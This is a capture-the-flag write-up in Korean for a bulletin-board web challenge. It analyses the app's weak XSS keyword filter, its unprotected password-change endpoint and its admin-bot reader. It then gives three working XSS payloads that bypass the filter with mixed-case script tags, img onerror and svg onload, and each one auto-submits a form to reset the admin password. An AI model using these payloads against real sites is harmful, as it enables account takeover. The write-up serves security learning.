### 소스코드 분석 

우선 해당 문제 사이트에 접속하면 어떤 기능들이 있는지 확인해 본다. Register, Login을 거치면 게시판 페이지를 만날 수 있다. `Write`와 `Logout` 기능이 구현되어 있으며 글을 작성하면 `게시판으로 돌아가기`와 `읽기 요청 보내기` 버튼이 존재한다. 게시판에는 admin이 작성한 “flag”라는 제목의 글이 존재한다. admin이 아닌 id와 pw로 로그인해서 접근해봤을 때 “You are not authorized to view this message”라는 메시지를 얻을 수 있다. 

전체적인 흐름을 봤을 때,  글쓰기 기능을 통해 공격을 시도한 뒤 관리자에게 글 읽기 요청을 보내고, admin의 계정을 탈취해서 flag라는 글을 읽어야 할 것이라고 추측해볼 수 있다. 


다음으로 app.py를 분석해 본다. 

```python
def xss_check(content):
    xss_filter = ["script", "frame", "obejct", "data", "alert","fetch","XMLHttpRequest","eval"]
    for _ in xss_filter:
         content = content.replace(_, "*")
    return content
```

```python
@app.route("/write", methods=["GET", "POST"])
@login_required
def write():
    if not current_user.is_authenticated:
        return redirect(url_for('login'))
    if request.method == "GET":
        return render_template("write.html")
    else:
        new_title = request.form.get("new_title")
        new_content = request.form.get("new_content")
        new_content = xss_check(new_content)
        new_message = {"title": new_title, "content": new_content, "author": current_user.username}
        bulletin_messages.append(new_message)
        return redirect(url_for('bulletin_board'))
```

/write로 글을 작성할 때 xss_check는 하고 있지만 사용자의 입력을 그대로 new_content에 받고 있어 XSS 취약점이 발생한다. 

```python
@app.route("/read_request/<int:message_id>")
@login_required
def read_request(message_id):
    if 0 <= message_id < len(bulletin_messages):
        message = bulletin_messages[message_id]
        if current_user.username == message["author"]:
            url = f"http://ecs-winner.chals.io/bulletin_content/{message_id}"
            admin_password = FLAG
            result = read_url(url, {"name": "admin", "value": generate_password_hash(admin_password)}, username="admin", password=admin_password)
            if result:
                return "Read request successfully sent!"
            else:
                return "Error in sending read request."
        else:
            return "You are not authorized to send a read request for this message."
    return "Invalid message ID"
```

/write로 작성한 글을 /bulltin_content로 확인해볼 수 있다. `읽기 요청 보내기` 버튼을 누르면 /read_request에 의해 해당 페이지의 url이 read_url로 전달되는 것을 확인할 수 있다. 

```jsx
def read_url(url, params, username="admin", password=None):
    try:
        capabilities = DesiredCapabilities.CHROME
        capabilities['goog:loggingPrefs'] = {'performance': 'ALL'}
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        driver = webdriver.Chrome(options=chrome_options)
        if username and password:
            driver.get("http://ecs-winner.chals.io/login")
            element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            element.send_keys(username)
            element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "password"))
            )
            element.send_keys(password)
            element.submit()
        driver.get(url)
        max_wait_time = 1000
        WebDriverWait(driver, max_wait_time).until(
            EC.presence_of_element_located((By.TAG_NAME, 'body'))
        )
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False
```

read_url에서는 selenium을 사용해서 url을 읽는다. /read_request에서 `read_url(url, {"name": "admin", "value": generate_password_hash(admin_password)}, username="admin", password=admin_password)` 으로 파라미터를 주었기 때문에, admin으로 로그인된 채로 요청된 url을 읽는다.

```python
@app.route("/changepw", methods=["POST"])
def changepw():
    userid = request.form.get("userid")
    userpw = request.form.get("userpw")

    if userid in users:
        old_password_hash = users[userid]
        users[userid] = generate_password_hash(userpw)
        return redirect(url_for('login'))
    
    return render_template("changepw.html", msg="false")
```

/changepw는 페이지에 접속해서는 볼 수 없는 엔드포인트이다. 해당 부분은 `POST 방식`의 요청만 가능하며, 사용자가 입력한 id와 pw를 가져와서 user에 해당 id가 존재할 경우에 비밀번호를 변경해준다. <br></br>

### 문제 풀이
코드를 분석한 결과, 예상되는 공격 시나리오는 다음과 같다. 

1. 게시글 작성을 통해 /changepw에 POST 요청을 보낸 후 admin 계정의 pw를 임의의 문자로 변경하는 스크립트를 작성한다.
2. 작성한 글의 /bulltin_content로 접속해 읽기 요청 버튼을 누른다. 
3. 현재 계정에서 로그아웃한 뒤, pw가 변경된 admin 계정으로 로그인해 flag를 확인한다. <br></br>

### 문제 해결
```html
<!--changepw.html-->
<form method="POST" action="/changepw">
        <label for="userid">Username:</label>
        <input type="text" id="userid" name="userid" required>
        
        <label for="userpw">New Password:</label>
        <input type="text" id="userpw" name="userpw" required>
        
        <button type="submit">Change Password</button>
    </form>
```

changepw.html의 형식을 확인한 뒤, 이에 알맞는 공격을 /write에 작성한다.  다음 내용들을 유의해야 한다. 
1. admin이 해당 글을 읽었을 때, /changpw에<form>내용의 POST 요청이 자동으로 이루어지는 것이 좋다.
2. xss_check를 하고 있으므로, 이를 우회해야 한다. <br></br>

### 공격 스크립트 예시 
```jsx
//대소문자 이용한 우회
<form id="csrf" method="POST" action="https://ecs-winner.chals.io/changepw">     
   <input type="text" id="userid" name="userid" value="admin">     
   <input type="text" id="userpw" name="userpw" value="aaa">     
   <button type="submit">Change Password</button> 
</form> 
<ScripT>     
   document.getElementById("csrf").submit(); 
</scrIpT>
```

```jsx
//img 태그, onerror 이용
<form id="csrf" method="POST" action="https://ecs-winner.chals.io/changepw">     
   <input type="text" id="userid" name="userid" value="admin">     
   <input type="text" id="userpw" name="userpw" value="bbb">     
   <button type="submit">Change Password</button> 
</form> 
<img src=x onerror="document.getElementById('csrf').submit();">
```

```jsx
//svg/onload 이용 
<form id="csrf" method="POST" action="https://ecs-winner.chals.io/changepw" onload="submit()">
   <input type="text" id="userid" name="userid" value="admin">     
   <input type="text" id="userpw" name="userpw" value="ccc">     
   <button type="submit">Change Password</button> 
  </form>
<svg/onload=document.getElementById("csrf").submit();>
```

해당 내용을 /write에 작성한 뒤, 읽기 요청을 보내고 나면 admin으로 로그인해서 “flag” 글을 읽을 수 있다.
